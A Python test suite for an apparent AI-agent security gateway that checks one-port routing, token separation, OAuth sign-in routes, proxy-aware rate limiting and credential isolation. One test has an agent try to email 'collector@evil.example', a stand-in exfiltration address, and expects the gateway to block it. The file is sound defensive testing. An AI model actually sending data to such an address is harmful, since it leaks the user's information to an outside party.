"""Plan F2 (D-055): the website, API and gateway on one port, for a host that exposes only one.

Real HTTP on one real port. The sign-in routes are requested with the public host name the deployment will use, because a
proxy in front of it forwards that name and the gateway must accept it.
"""

from __future__ import annotations

import argparse
import tempfile
from pathlib import Path

import httpx
import pytest
import pytest_asyncio
from fastmcp import Client
from fastmcp.client.transports import StreamableHttpTransport

from sentinel.api import create_api
from sentinel.cli import ports_in_use, tool_server_env
from sentinel.gateway import build_gateway
from sentinel.oauth import SentinelOAuthProvider
from sentinel.oneport import SIGN_IN_LIMIT, OnePort, RateLimit, client_address
from sentinel.runtime import build_runtime
from sentinel.stack import free_port, serve
from sentinel.tools.server import build_tools_server
from sentinel.upstreams import Credentials, UpstreamSet

API_TOKEN, DOWNSTREAM = "test-api-token", "test-downstream-secret"
PUBLIC = "https://hexley.site"


@pytest_asyncio.fixture(scope="module")
async def hosted():
    port, tools_port = free_port(), free_port()
    rt = build_runtime(tools_url=f"http://127.0.0.1:{tools_port}/mcp", gateway_url=f"http://127.0.0.1:{port}/mcp",
                       downstream_token=DOWNSTREAM, api_token=API_TOKEN, audit_dir=Path(tempfile.mkdtemp(prefix="sentinel-oneport-")))
    rt.oauth = SentinelOAuthProvider(rt, base_url=PUBLIC)
    tools, sink = build_tools_server(DOWNSTREAM, rt.uploads_dir)
    app = OnePort(create_api(rt), build_gateway(rt).http_app())
    started = [await serve(tools.http_app(), tools_port), await serve(app, port)]
    try:
        yield rt, f"http://127.0.0.1:{port}", app, sink
    finally:
        for server, _ in started:
            server.should_exit = True
        for _, task in started:
            await task


def _officer(base: str) -> httpx.AsyncClient:
    return httpx.AsyncClient(base_url=base, headers={"Authorization": f"Bearer {API_TOKEN}"}, timeout=30)


async def _session_token(base: str) -> str:
    async with _officer(base) as api:
        r = await api.post("/api/v1/slips", json={
            "objective": "Summarise the reports for the manager", "confirm": True,
            "allowed_tools": ["read_document", "send_email"], "allowed_destinations": ["corp.example"], "max_messages": 2})
        assert r.status_code == 201, r.text
        return r.json()["header_value"].removeprefix("Bearer ")


async def test_the_api_answers_on_the_shared_port(hosted):
    _, base, _, _ = hosted
    async with httpx.AsyncClient(base_url=base) as c:
        assert (await c.get("/health")).json()["status"] == "ok"
        assert (await c.get("/api/v1/connect")).json()["mcp_url"] == f"{PUBLIC}/mcp"


async def test_an_agent_runs_through_the_gateway_on_the_shared_port_and_the_rules_still_decide(hosted):
    _, base, _, sink = hosted
    token = await _session_token(base)
    async with Client(StreamableHttpTransport(f"{base}/mcp", headers={"Authorization": f"Bearer {token}"})) as c:
        assert "read_document" in {t.name for t in await c.list_tools()}
        await c.call_tool("read_document", {"path": "reports/q3_summary.pdf"})
        with pytest.raises(Exception, match="Blocked"):
            await c.call_tool("send_email", {"to": "collector@evil.example", "subject": "x", "body": "y"})
    assert not [m for m in sink.snapshot() if "evil.example" in m["to"]]


async def test_the_gateway_on_the_shared_port_refuses_a_caller_with_no_token(hosted):
    _, base, _, _ = hosted
    async with httpx.AsyncClient(base_url=base) as c:
        r = await c.post("/mcp", headers={"Accept": "application/json, text/event-stream", "Content-Type": "application/json"},
                         json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    assert r.status_code == 401 and "oauth-protected-resource" in r.headers.get("www-authenticate", "")


async def test_sign_in_routes_reach_the_gateway_under_the_public_host_name_never_the_website(hosted):
    _, base, _, _ = hosted
    async with httpx.AsyncClient(base_url=base, headers={"Host": "hexley.site", "X-Forwarded-Proto": "https"}) as c:
        meta = await c.get("/.well-known/oauth-authorization-server")
        assert meta.status_code == 200 and meta.json()["issuer"].rstrip("/") == PUBLIC
        resource = await c.get("/.well-known/oauth-protected-resource/mcp")
        assert resource.status_code == 200 and resource.json()["resource"].rstrip("/") == f"{PUBLIC}/mcp"
        for path in ("/authorize", "/token", "/register", "/oauth/consent"):
            r = await c.get(path)
            assert "text/html" not in r.headers.get("content-type", "") or path == "/oauth/consent", path


async def test_a_session_token_opens_nothing_on_the_officers_api_and_the_reverse(hosted):
    _, base, _, _ = hosted
    token = await _session_token(base)
    async with httpx.AsyncClient(base_url=base, headers={"Authorization": f"Bearer {token}"}) as c:
        assert (await c.get("/approvals")).status_code in (401, 403)
    with pytest.raises(Exception):
        async with Client(StreamableHttpTransport(f"{base}/mcp", headers={"Authorization": f"Bearer {API_TOKEN}"})) as c:
            await c.list_tools()


def test_no_api_route_is_hidden_by_a_gateway_route(hosted):
    _, _, app, _ = hosted
    api_paths = [r.path for r in app.api.routes if getattr(r, "path", None) and r.path != "/"]
    assert app.paths and not [p for p in api_paths if app.is_gateway(p)]


@pytest.mark.parametrize("path, gateway", [
    ("/mcp", True), ("/mcp/", True), ("/oauth/consent", True), ("/.well-known/oauth-authorization-server", True),
    ("/", False), ("/connect", False), ("/mcpx", False), ("/api/v1/connect", False), ("/tokens", False), ("/console/", False),
])
def test_paths_are_matched_whole(hosted, path, gateway):
    _, _, app, _ = hosted
    assert app.is_gateway(path) is gateway


def test_one_address_is_slowed_and_others_are_not_and_the_limit_forgets_each_minute():
    now = [0.0]
    limit = RateLimit(clock=lambda: now[0])
    assert all(limit.allow("1.2.3.4", "sign-in", 3) for _ in range(3))
    assert not limit.allow("1.2.3.4", "sign-in", 3)
    assert limit.allow("5.6.7.8", "sign-in", 3) and limit.allow("1.2.3.4", "gateway", 3)
    now[0] = 61.0
    assert limit.allow("1.2.3.4", "sign-in", 3)


def test_only_the_proxys_own_entry_names_the_caller_so_a_claimed_address_cannot_dodge_the_limit():
    proxied = {"client": ("127.0.0.1", 1), "headers": [(b"x-forwarded-for", b"9.9.9.9, 203.0.113.7")]}
    assert client_address(proxied) == "203.0.113.7"
    assert client_address({"client": ("203.0.113.9", 1), "headers": [(b"x-forwarded-for", b"9.9.9.9")]}) == "203.0.113.9"
    assert client_address({"client": ("127.0.0.1", 1), "headers": []}) == "127.0.0.1"


def test_a_proxy_reaching_the_container_through_dockers_bridge_still_names_the_real_caller():
    """Found on the live server: Caddy arrives from the bridge, so believing only loopback made every visitor one address."""
    for a, b in (("198.51.100.1", "198.51.100.2"),):
        first = {"client": ("172.17.0.1", 1), "headers": [(b"x-forwarded-for", a.encode())]}
        second = {"client": ("172.17.0.1", 1), "headers": [(b"x-forwarded-for", b.encode())]}
        assert client_address(first) == a and client_address(second) == b
    assert client_address({"client": ("not-an-address", 1), "headers": [(b"x-forwarded-for", b"9.9.9.9")]}) == "not-an-address"


async def test_too_many_sign_ins_from_one_address_get_429_and_the_website_is_unaffected(hosted):
    _, base, app, _ = hosted
    saved, app.limit = app.limit, RateLimit()
    try:
        async with httpx.AsyncClient(base_url=base, timeout=30, headers={"X-Forwarded-For": "203.0.113.50"}) as c:
            codes = [(await c.get("/register")).status_code for _ in range(SIGN_IN_LIMIT + 1)]
            assert codes[-1] == 429 and 429 not in codes[:-1]
            assert (await c.get("/health")).status_code == 200
        async with httpx.AsyncClient(base_url=base, timeout=30, headers={"X-Forwarded-For": "203.0.113.51"}) as other:
            assert (await other.get("/register")).status_code != 429
    finally:
        app.limit = saved


def test_the_built_in_tool_server_does_not_inherit_a_connectors_credential():
    connectors = UpstreamSet(creds=Credentials({"GITHUB_TOKEN": "value", "NOTION_TOKEN": "value"}))
    env = tool_server_env({"PATH": "/bin", "GITHUB_TOKEN": "value", "NOTION_TOKEN": "value"}, connectors)
    assert env == {"PATH": "/bin"}


def test_one_port_mode_does_not_ask_for_the_gateways_port():
    args = argparse.Namespace(api_port=10000, gateway_port=8100, tools_port=8300, one_port=True)
    assert {p for p, _ in ports_in_use(args).values()} == {10000, 8300}
    args.one_port = False
    assert {p for p, _ in ports_in_use(args).values()} == {10000, 8100, 8300}
